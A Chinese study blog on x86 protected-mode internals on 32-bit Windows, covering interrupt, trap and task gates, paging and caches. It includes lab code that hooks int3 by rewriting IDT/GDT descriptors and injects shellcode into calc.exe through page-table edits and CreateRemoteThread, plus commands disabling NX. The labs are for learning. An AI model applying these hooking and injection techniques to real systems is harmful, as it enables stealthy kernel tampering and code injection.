+<p><strong>总结</strong>：中断门进入后，会将eflags改为2（if位为0），以我的理解是为了避免中断里面又出中断，所以返回时会恢复if位；</p>
+<p>所以在中断门里，其他中断会被阻塞，比如缺页中断；</p>
+<p>和中断门类似的<strong>陷阱门</strong>进入后eflags为202，也就是if位为1；</p>
+<p>那实际上中断门进入是清空eflags的VM NT IF TF位，陷阱门少一个IF位；</p>
+<p>陷阱门的结构和中断门一样，只是type为f！也是通过ldt进入，int触发；</p>
+<p>所以中断门是阻塞的，陷阱门是不阻塞的，原因是中断由外部设备请求，陷阱是程序自发；</p>
+<p>在处理函数中的栈结构（r0中的栈）如下：</p>
+<table>
+<thead>
+<tr>
+<th>eip</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>cs</td>
+</tr>
+<tr>
+<td>eflags</td>
+</tr>
+<tr>
+<td>esp</td>
+</tr>
+<tr>
+<td>ss</td>
+</tr>
+</tbody></table>
+<p>补充获取表姿势：</p>
+<p>32位下四个指令：</p>
+<p>sgdt sidt获取，获取的内容是一个6字节结构，前两字节为表长，后4字节为表的地址，r3下即可使用；</p>
+<p>lgdt lidt改写，改变表的位置，r0下才可以调用；</p>
+<h3 id="INT3-HOOK"><a href="#INT3-HOOK" class="headerlink" title="INT3_HOOK"></a>INT3_HOOK</h3><p>一个基于中断门机制的hook小实验；</p>
+<p>注意！只有在win32上有效，而且很没有什么实际用处（个人认为，因为会导致其他地方的int3出问题，只有自己进程的有用）；</p>
+<p>我们知道了对于int调用，实际上就是查idt表；</p>
+<p>那么int3实际上调用的就是idt表第三项的函数，同时改段属性；</p>
+<p>对于INT3_HOOK的本质，就是不去更改描述符中的函数地址，而去改描述符里的段属性；</p>
+<p>使得进入int3调用的时候，依然使用原地址寻址，但是加上我们自己构造的base值，跳转到相应的hook函数，再jmp回原本的int3地址；</p>
+<p>这样做的好处？根据我的理解实际上在做的时候，应该是自己构造一个伪gdt，而不是去动int3的段选择子；</p>
+<p>这样才能保证ldt原封不动没去修改，被检测到hook的可能降低；</p>
+<p>但是请注意，由于intel的CPU有两个个特性：流水线和预测，根据我的理解，它会把取地址，译码，取数据，以及预测后续地址分开进行；</p>
+<p>那么会出现一种情况：当我们跳转到hook函数时，这个时候的cs段的base不是0，那么在后续预测时取到新的地址块（一块一块取地址，一一条一条这么寻址效率太低），它的寻址方式就会用那个地方的eip + base，相当于取到的代码都飞远了，译码也是用的这些远处的代码，自然会崩溃，像是有一个缓冲代码区，会把预测的代码提前取到缓冲区进行预测，取数据，只有进行大跳转的时候，或者到了该取新地址块的数据的时候，这个缓冲区才会刷新，刷新的同时会进行寻址；</p>
+<p>所以当我们进入hook函数的时候，就应该直接跨段跳转走，跨到base为0的段上去正确执行我们的代码；</p>
+<p>思路是：</p>
+<ol>
+<li>构造gdt一个新的描述符属性为我们自己定义的段去进行hook函数的跳转；</li>
+<li>那实际上进入r0，需要ss段一起更改，所以还需要写一个ss段的描述符在新描述符的后面；</li>
+<li>修改int3处的段选择子为新段；</li>
+<li>进入中断门后进行cs跨段跳转为base0；</li>
+<li>hook功能实现；</li>
+<li>跳转回原int3执行；</li>
+</ol>
+<p>获取gdt和idt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">1: kd&gt; r gdtr</span><br><span class="line">gdtr=807d2c20</span><br><span class="line">1: kd&gt; dq 807d2c20</span><br><span class="line">ReadVirtual: 807d2c20 not properly sign extended</span><br><span class="line">807d2c20  00000000`00000000 00cf9b00`0000ffff</span><br><span class="line">807d2c30  00cf9300`0000ffff 00cffb00`0000ffff</span><br><span class="line">807d2c40  00cff300`0000ffff 80008b7c`d75020ab</span><br><span class="line">807d2c50  8040937c`a0003748 7f40f3fd`f0004000</span><br><span class="line">807d2c60  0000f200`0400ffff 00000000`00000000</span><br><span class="line">807d2c70  8000897c`fac00068 8000897c`fb300068</span><br><span class="line">807d2c80  00000000`00000000 00000000`00000000</span><br><span class="line">807d2c90  800092b9`900003ff 00000000`00000000</span><br><span class="line"></span><br><span class="line">1: kd&gt; r idtr</span><br><span class="line">idtr=807d3020</span><br><span class="line">1: kd&gt; dq 807d3020</span><br><span class="line">ReadVirtual: 807d3020 not properly sign extended</span><br><span class="line">807d3020  83e48e00`0008c200 83e48e00`0008c390</span><br><span class="line">807d3030  00008500`00580000 83e4ee00`0008c800</span><br><span class="line">807d3040  83e4ee00`0008c988 83e48e00`0008cae8</span><br><span class="line">807d3050  83e48e00`0008cc5c 83e48e00`0008d258</span><br><span class="line">807d3060  00008500`00500000 83e48e00`0008d6b8</span><br><span class="line">807d3070  83e48e00`0008d7dc 83e48e00`0008d91c</span><br><span class="line">807d3080  83e48e00`0008db7c 83e48e00`0008de6c</span><br><span class="line">807d3090  83e48e00`0008e51c 83e48e00`0008e8d0</span><br></pre></td></tr></table></figure>
+
+<p>我会选择修改int3描述符为：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int3：83e4ee00`0008c800 -&gt; 83e4ee00`0060c800</span><br></pre></td></tr></table></figure>
+
+<p>并在gdt 60的地方，也就是807d2c80的地方，写上cs段描述符和ss段描述符（r0权限）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7ccf9b5b`4800ffff 00cf9300`0000ffff</span><br></pre></td></tr></table></figure>
+
+<p>这里base设定为了7c5b4800，因为7c5b4800+83e4c800 = 401000，是我们hook函数的地址；</p>
+<p>使用windbg查找内核函数DbgPrint，我们在实现功能处打印一个字符串，以表示hook成功：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; u nt!DbgPrint</span><br><span class="line">nt!DbgPrint:</span><br><span class="line">83e09271 8bff            mov     edi,edi</span><br><span class="line">83e09273 55              push    ebp</span><br><span class="line">83e09274 8bec            mov     ebp,esp</span><br><span class="line">83e09276 51              push    ecx</span><br><span class="line">83e09277 6a01            push    1</span><br><span class="line">83e09279 8d450c          lea     eax,[ebp+0Ch]</span><br><span class="line">83e0927c 50              push    eax</span><br><span class="line">83e0927d ff7508          push    dword ptr [ebp+8]</span><br></pre></td></tr></table></figure>
+
+<p>拿到内核函数地址：0x83e09271</p>
+<p>接下来就是代码实现了，当我们修改完gdt和idt之后，利用进程去实现hook：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//vs2008模板</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">ULONG</span> <span class="params">(__cdecl *DbgPrintProc)</span><span class="params">(PCSTR Format,...)</span></span>;</span><br><span class="line">DbgPrintProc DbgPrint = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* seco = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//未开启基址随机，默认为401000</span></span><br><span class="line"><span class="keyword">void</span> _declspec(naked) myHook()</span><br><span class="line">&#123;</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        push <span class="number">0x8</span></span><br><span class="line">        push tiaoban</span><br><span class="line">        jmp fword ptr [esp] <span class="comment">//进行跨段跳转，第四步，跳到08段</span></span><br><span class="line">tiaoban:</span><br><span class="line">        add esp, <span class="number">8</span></span><br><span class="line">        </span><br><span class="line">        pushad</span><br><span class="line">        pushfd</span><br><span class="line">        push fs</span><br><span class="line">        push <span class="number">0x30</span> <span class="comment">//内核环境，不然调用内核函数有问题</span></span><br><span class="line">        pop fs</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//实现逻辑，第五步</span></span><br><span class="line">        push seco</span><br><span class="line">        call DbgPrint</span><br><span class="line">        add esp, <span class="number">4</span></span><br><span class="line">        </span><br><span class="line">        pop fs</span><br><span class="line">        popfd</span><br><span class="line">        popad</span><br><span class="line">        mov dword ptr ss:[esp<span class="number">-4</span>], <span class="number">0x83e4c800</span> <span class="comment">//转入原int3处理函数，第六步</span></span><br><span class="line">		jmp dword ptr ss:[esp<span class="number">-4</span>]</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;执行地址： %p\n&quot;</span>,myHook);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//使用malloc获取为了防止ds数据段上的缺页中断</span></span><br><span class="line">    seco = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">10</span>*<span class="keyword">sizeof</span>(<span class="keyword">char</span>));</span><br><span class="line">    <span class="built_in">memcpy</span>(seco,<span class="string">&quot;SecondBC\x0a\x00&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    <span class="comment">//之前拿到的内核函数</span></span><br><span class="line">    DbgPrint = (DbgPrintProc)<span class="number">0x83e09271</span>;</span><br><span class="line">    </span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    __asm</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> <span class="number">3</span></span><br><span class="line">    &#125;</span><br><span class="line">    system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当激活int3时，就会进入myHook函数，之后进行打印字符串，然后转入真正的int3执行它的代码；</p>
+<p>需要注意的是，windbg并不会显示打印出来的字符，需要使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.ofilter &quot;内容&quot;</span><br></pre></td></tr></table></figure>
+
+<p>去设置过滤规则，它是完全匹配的，少一个字节都不给你回显（回车键\x0a）！</p>
+<p>设置好之后，一定要去生成好的文件执行，不要通过vs的调试模块执行，为什么呢？</p>
+<p>因为调试模块执行会给我们自动下int3断点，但是它的进程的401000不是一个有效的函数，所以会直接蓝屏！</p>
+<p>执行的效果如图：</p>
+<p><img src="https://s2.loli.net/2024/11/04/p6Rao4TMiOylBf8.png" alt="int3hook"></p>
+<p>可以看到windbg成功带出字符串，证明hook成功；</p>
+<p><strong>纠错</strong>：但经过这个实验可以发现ss实际上还是被设置为了10，也就是默认的r0 ss段！并不是设定cs段的后一项？</p>
+<p>实际上是因为32位系统会取tr任务段里面的ss保存值，进行r0切换，对于syscall一类的系统调用会是cs的后一项值；</p>
+<h2 id="任务段-amp-门"><a href="#任务段-amp-门" class="headerlink" title="任务段&amp;门"></a>任务段&amp;门</h2><p>在64位中，任务段用的特别少，几乎不用做其原本功能；</p>
+<p>补充windbg操作指令： </p>
+<p>dg 0000h 解析段选择子选择的段描述符；</p>
+<p>dt 模块!名称（可搭配正则表达） 查找符号对应地址；</p>
+<p>!process 0 0，进行遍历操作系统上的所有进程；</p>
+<p>在寄存器中，也有一个寄存器专门存放任务段，在windbg里面叫做 tr ；</p>
+<p>存放的则是任务段的段选择子；</p>
+<p>任务段的功能则是保存任务段结构，切换任务段则切换任务段结构；</p>
+<p>如下为任务段结构：</p>
+<p><img src="https://s2.loli.net/2024/11/05/Usw7YPe8oVlMBO9.png" alt="task1"></p>
+<p>实际上就是切换寄存器环境，所以一个任务，相当于一个线程；</p>
+<p>但是操作系统为了不和CPU硬件的功能设计捆绑在一起，所以虚拟了线程的概念，而没有实际直接运用任务的概念；</p>
+<p>Previous Task Link存放的是旧的任务段选择子的值，ESP0,ESP1的意思是0环的栈，1环的栈；</p>
+<p>每个环都有不同的栈；</p>
+<p>LDT指的是LDT的段选择子；</p>
+<p>任务段描述符：</p>
+<p><img src="https://s2.loli.net/2024/11/05/GIidLKUlF7q9grJ.png" alt="task2"></p>
+<p>其中就存放了任务段结构的地址（base属性），type里的b，指的是busy，如果是可用的（available）则是0，如果是正在用的（busy），则是1；</p>
+<p>任务段也是放在gdt表，使用call或者jmp都可以跨段并切换环境（任务段结构），同时jmp也只能用在这里提权；</p>
+<p>用这种方法切换任务，会使得当前eflags的NT位（嵌套任务）置1；</p>
+<p>iretd执行的时候会先检测NT位，如果为0，则按照栈存方式恢复寄存器；</p>
+<p>如果是1，会按照Previous Task Link保存的内容进行恢复返回；</p>
+<p>之前的调用门，中断门进入的时候，实际上就是在当前任务段结构的esp0，和ss0上进行找值更改，但是并不会改变tr；</p>
+<p>任务门描述符如下：</p>
+<p><img src="https://s2.loli.net/2024/11/05/DeT96WcZbSVoqL5.png" alt="task_gate"></p>
+<p>它只有一个属性：任务段选择子；P DPL S也是e（1110），type为5；</p>
+<p>在32位下，一般放在int8的位置（idt表），通过int激活进入门，效果和call任务段一样的，都是切换寄存器环境；</p>
+<p>但有一点，因为它是在中断表里的，所以会有中断门的性质，比如VM IF TF的清空，但会把NT位置1，原因前面说过了；</p>
+<h2 id="页"><a href="#页" class="headerlink" title="页"></a>页</h2><h3 id="引入和介绍-1"><a href="#引入和介绍-1" class="headerlink" title="引入和介绍"></a>引入和介绍</h3><p>win32下的分页模式一般有两种，一种为101012模式，一种为29912模式；</p>
+<p>后者有个特征便是进程的CR3是按20h隔开的，win7默认就是；</p>
+<p>要在win7上配置101012模式分页的步骤如下：</p>
+<p>首先也是创建一个新的引导，步骤如环境节里所述；</p>
+<p>之后用管理员权限打开cmd，输入如下指令：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bcdedit /<span class="built_in">set</span> pae ForceDisable #强制关闭pae</span><br><span class="line">bcdedit /<span class="built_in">set</span> nx AlwaysOff</span><br></pre></td></tr></table></figure>
+
+<p>之后查看cr3以确认是否配置环境成功；</p>
+<p>在system32目录下，有两个内核文件：</p>
+<p>ntkrnlpa.exe和ntoskrnl.exe；在system32/driver里的驱动文件，其模块就包含有ntoskrnl；</p>
+<p>这两个文件是分页用到的文件，前者对应29912，后者对应101012；</p>
+<p>模块不会包含ntkrnlpa，但是如果模式是29912，依然用的是ntkrnlpa里面的内容，就和kernel32和kernelbase的关系类似；</p>
+<p>已知保护模式下用的是虚拟地址，如何得到物理地址？</p>
+<h3 id="页表寻址"><a href="#页表寻址" class="headerlink" title="页表寻址"></a>页表寻址</h3><p>要使用到操作系统课上讲的页表机制；</p>
+<p>101012模式指的就是10位 10位 12位；</p>
+<p>虚拟地址32位按照上述规则进行划分，12位代表页内偏移，中间10位代表页表项（PTE），高10位代表页目录项（PDE）；</p>
+<p>实际上可以理解为两级页表，为了实现页表的切入切出和离散存储（因为页表也比较大），所以才有的二级页表（页目录）；</p>
+<p>每个进程都有一个cr3寄存器，里面存的值是一个物理地址；</p>
+<p>这个物理内存就是二级页表，通过这个二级页表进行虚拟地址的查询方式，进而获得虚拟地址对应的物理地址；</p>
+<p>页表存的都是指针，但是后12位代表属性，不做为地址使用；</p>
+<p>注意，在windbg里面查看物理地址，需要带感叹号!dd；</p>
+<p><img src="https://s2.loli.net/2024/11/06/g3e9PvYzZRjnGNU.png" alt="二级页表"></p>
+<p>具体寻址算法为：</p>
+<p><strong>一级页表地址 = (（DWORD*）cr3值（二级页表）)[虚拟地址高10位] （高10位是个索引，不是偏移）</strong></p>
+<p><strong>对应内存块地址 = (（DWORD*）一级页表)[虚拟地址中10位]     （中10位代表页号，也是索引）</strong></p>
+<p><strong>真实物理地址 = 内存块地址 + 页内偏移</strong></p>
+<p>需要注意的是，101012分页模式页表存储的直接就是地址，不是内存块号，不要换算；</p>
+<p>上面就可以解释，为什么同样的40W地址能拿到不同的内存内容，因为cr3（二级页表）不一样啊，对应的一级页表也不一样；</p>
+<p>对于CPU而言，里面有如下内容：MMU单元，TLB快表，页表缓存，L1，L2，L3缓存；</p>
+<p>MMU单元就是负责页表寻址的，其基本功能就是一个输入cr3和虚拟地址输出一个数据的函数；</p>
+<p>一开始寻址的时候会直接拿高20位去TLB里面找缓存，如果找到了，就会得到一个内存块号，接着拿到L1~3中去继续找对应存储数据内容，找不到就开始拆虚拟地址；</p>
+<p>当把高10位拆出去之后，把中10位（一级页号）拿到页表缓存中去找，也是一个道理，如果找到了，就会得到一个内存块号，接着拿到L1~3中去继续找对应存储数据内容，找不到就继续拆虚拟地址；</p>
+<p>当拆到底以后，计算出物理页（内存块），就会拿到L1~L3去找，还找不到？</p>
+<p>还找不到就计算板卡地址，到内存条上去寻址；</p>
+<p>当取到数据以后，会把数据对应的内存块，一级页号，二级页号，依次写回缓存中去，方便下次快速查找；</p>
+<p>对于L1~L3的关系，则是经过一段指令周期以后，L1往L2写内容，L2往L3写内容，L3往内存条写内容，L1则是由内存上取到数据以后进行写回；</p>
+<p>实际上L缓存的结构像是一个二维数组；</p>
+<p>假设L1~L3属性如下：</p>
+<p><img src="https://s2.loli.net/2024/11/06/D61GFJ9AoO3mHYn.png" alt="L缓存"></p>
+<p>实际上L1分成了两部分，一部分是D（数据），一部分是I（指令）；</p>
+<p>以L2作为例子，总大小为256KB，每一行有64B，相当于有（256*1024）/64 = 4096行；</p>
+<p>L2有4路，代表的意思是将4096分成四份，每一份拥有4096 /4 = 1024行；</p>
+<p>相当于每一份拥有1024*64 = 64KB，在CPU内部的算法将L2内容写回L1时，或者写到L3时就是按照64KB为一次来的（分块写）；</p>
+<h3 id="页表项属性"><a href="#页表项属性" class="headerlink" title="页表项属性"></a>页表项属性</h3><p><img src="https://s2.loli.net/2024/11/07/wNRgO5IiXdYcTQM.png" alt="pagec"></p>
+<p>PDE和PTE分别对应二级页表，一级页表，他们的后12位都是属性值，因为它们都按1000h对齐，所以后12位空闲可用；</p>
+<p>p，有效位，为0是无效；</p>
+<p>R/W，读写位，为0只读，为1可写；</p>
+<p>U/S，权限位，为1是r3，为0是r0，和之前讲到的s一样；</p>
+<p>PWT,PCD,PAT与缓存相关；</p>
+<p>A，访问位，访问过就置1；</p>
+<p>D位是修改位，被写过就置1，二级页表（PDE）的始终为0；</p>
+<p>PDE的PS位是大页位；</p>
+<p>G，全局页；</p>
+<p>avail，给操作系统预留；</p>
+<p>补充知识点：</p>
+<p>就算是这里算出来的物理地址，其实都只是L1~L3缓存的一个索引，并不是内存条上的地址，内存条上的地址叫板卡地址；</p>
+<p>实际上访问L1，L2，L3也是通过访问其每一行的哈希值进行读写的，并不会直接使用物理地址；</p>
+<p>虚拟内存换进换出的操作，使得没有使用的新分配内存空间不会获得物理页，也就没有页表项，内存的释放其实也是对页表项的释放；</p>
+<p>当程序访问到页表时发生缺页中断，自行修复，恢复页表项和对应物理页（比如memset函数）；</p>
+<h3 id="挂页实验"><a href="#挂页实验" class="headerlink" title="挂页实验"></a>挂页实验</h3><p>我们已然知晓页的机制，那么是否可以替换别的进程的0地址（虚拟地址）为我们自己分配的页地址（物理地址），以执行我们的壳代码呢？</p>
+<p>答案是可以的，在这个实验中修改目标进程的二级页表依然会用到windbg，目前还无法脱离windbg进行修改；</p>
+<p>同时会用到OpenProcess查找目标进程，CreateRemoteThread创建远程线程去主动执行壳代码；</p>
+<p>补充个小知识点：堆区不属于任何一个段，而且在现代操作系统中，保护模式下，段其实都是一个概念，没有真的用到偏移计算这种东西，只是一个权限划分罢了，基本上都是靠分页机制来进行对内存权限的管理和分配，又因为101012分页模式，导致一个问题则是什么页都可以有执行的权限；</p>
+<p>代码脚本如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.cpp : 定义控制台应用程序的入口点。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//第一步 shellcode call MessageBoxA</span></span><br><span class="line">	BYTE shellcode[] =  &#123;<span class="number">0x6a</span>,<span class="number">0x00</span>,<span class="number">0x6a</span>,<span class="number">0x00</span>,<span class="number">0x6a</span>,<span class="number">0x00</span>,<span class="number">0x6a</span>,<span class="number">0x00</span>,</span><br><span class="line">					   <span class="number">0xb8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0xff</span>,<span class="number">0xd0</span>,<span class="number">0xc3</span>&#125;;</span><br><span class="line">	*(DWORD*)(&amp;(shellcode[<span class="number">9</span>])) = (DWORD)MessageBoxA;</span><br><span class="line"> 	BYTE* mem = (BYTE*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BYTE)*<span class="number">0x1000</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(mem,&amp;shellcode,<span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    <span class="comment">//获取mem的虚拟地址，以找到物理地址</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;mem: %p\n&quot;</span>,mem);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//第二步 挂进程 calc pid 3476</span></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS,FALSE,<span class="number">3476</span>);</span><br><span class="line">	<span class="comment">//虚拟地址为0x4b0执行,malloc有页内偏移4b0</span></span><br><span class="line">	HANDLE hThread = CreateRemoteThread(hProcess,<span class="number">0</span>,<span class="number">0</span>,(LPTHREAD_START_ROUTINE)<span class="number">0x4b0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	CloseHandle(hThread);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">	system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先启动这个脚本，它会停到第二步，这个时候mem的地址依然打印出，且每次打印的页内偏移都是4b0；</p>
+<p>此时远程线程的虚拟地址为4b0，第一次和第二次页表都是0项，所以到calc进程的二级页表0项里面的0项给改成通过mem找到的物理页即可；</p>
+<p>又因为偏移相同，所以可以通过4b0虚拟地址找到相同的内存空间；</p>
+<p>再次回车执行远程线程，此时可以发现calc弹窗了；相当于calc进程执行了我们这个进程的一个函数！</p>
+<h3 id="页管理"><a href="#页管理" class="headerlink" title="页管理"></a>页管理</h3><p>对于101012模式，一个进程有1024（2的十次方）个PDE和PTE（二级页表项和一级页表项），每一项都是存放4字节指针的，所以一个进程的页表一共就有4MB大小；</p>
+<p>又因为高地址2G共享，每个进程的页表有2MB都一样；</p>
+<p>同时在虚拟内存的高2个G内存中，是内核内存，其中有4MB就是专门用来管理当前进程的页表的；</p>
+<p>在ntoskrnl文件中的一些操作就是对这个区域展开的；</p>
+<p>在101012模式下，操作系统设定的当前进程PDT（二级页表）位于 c0300000，PTT（一级页表）位于 c0000000（定死了，它们永远都是这个）；</p>
+<p>在ntoskrnl文件中进行物理寻址的时候，利用的则是这两个基址，因为ntoskrnl文件不能直接使用物理地址，也需要虚拟地址；</p>
+<p>因为ntoskrnl文件也是一个软件，尽管它是专门用于页表处理的；</p>
+<p>当操作系统本身进行页处理的时候，会通过这两个基址进行CPU intel架构的计算，从而拿到物理页地址（映射关系）；</p>
+<p>一个技巧：</p>
+<ul>
+<li>由于操作系统使用了虚拟地址来管理两个页表，那么可以通过实际CPU intel规定的页表寻址方法对 c0300000进行寻址（这个虚拟地址是否和cr3二级页表物理地址一一对应呢？），拿到的就肯定是cr3的值，也就是PDT（二级页表）对应的物理地址；</li>
+<li>对c0300000拆分，则是 300 300 000；</li>
+<li>已知当前进程的二级页表基址为c0300000，那么c0300000 + 300*4 = c0300c00，这个地方存的值实际上就是cr3；</li>
+<li>拿到这个值再次运算！ cr3 + 300*4 = c0300c00(虚拟地址依然是这个);</li>
+<li>取页内偏移: c0300c00+0 = c0300c00;</li>
+<li>所以 c0300c00 存的就是当前进程的cr3值！</li>
+<li>这样就可以不访问cr3而获取cr3的值（32位下绕过VT）；</li>
+</ul>
+<p>如图所示：</p>
+<p><img src="https://s2.loli.net/2024/11/12/5DTqSimVn8dOrk2.png" alt="环"></p>
+<p>这是一个环； 101012模式下，cr3+c00即可拿到本身；</p>
+<h2 id="29912模式"><a href="#29912模式" class="headerlink" title="29912模式"></a>29912模式</h2><p>101012模式是位于32根地址总线的分页模式产物；</p>
+<p>对于内存的不够使用，CPU架构引出了36根地址总线的分页模式：29912，使用的技术叫pae技术；</p>
+<p>它的地址继承了原本的4字节长度地址，线性地址没有突破，还是32位；</p>
+<p>但是由于物理内存（不是内存条）大小此时是2的36次方，64G，所以二级页表，一级页表的表项有了增多；</p>
+<p>原先的表项是4个字节，一个页内存1024项，现在的表项是8个字节，一个页内存512项；</p>
+<p>相当于也是管理4G内存，但是使用的页表总计为：<br>$$<br>4<em>512</em>512*8 = 8MB<br>$$<br>总共8MB；</p>
+<p>分页模式相当于多了一个页表，变成了三级；</p>
+<p>2 9 9 12的模式，计算规则同上，只不过项索引需要乘8，因为每项占8字节；</p>
+<p>在29912模式下，虚拟基址是c0600000（PDT二级页表）和c0000000（PTT一级页表），可以从ntkrnlpa.exe中获取；</p>
+<p>在进程内，只需要使用这两张表，不需要用到第三级页表，第三级页表的表项属性不影响最终的结果，依然是看两级，一级的页表项属性；</p>
+<p>但是从cr3开始找是算三级页表的；</p>
+<p>多出来的内存不是用于进程，而是供给键盘，等usb设备使用；</p>
+<p>由于101012模式下，所有内存都有可执行权；</p>
+<p>所以在29912以后，都在页属性(PDE，PTE结构)的最高位位置，新设了一位XD（NX）来进行执行权的约束，为1不可执行；</p>
+<p>在此模式下，malloc申请的空间就不可以直接执行了；</p>
+<p>这是DEP保护的本质；</p>
+<h2 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h2><p>在页表属性的时候，提到了三个位和缓存有关：PWT,PCD,PAT；</p>
+<p>概念：</p>
+<p><img src="https://s2.loli.net/2024/11/18/ZLaGwUIg1sBMCiX.png" alt="缓存类型"></p>
+<p>首先要有的理解是，CPU读数据写数据都是优先读写缓存的（L1,L2,L3）；</p>
+<p>同时，一行64B，作为缓存行；</p>
+<p>0 -&gt; 无缓存，直接从内存条拿数据；</p>
+<p>1 -&gt; 写合并，对于写这一过程，取L1缓存行没取到，取L2取到了，那么写到L2的同时，给L1添加相同缓存行，一次4个地址（intel）；</p>
+<p>6 -&gt; 回写，根据计数器被写回到内存条（先写回L1）；</p>
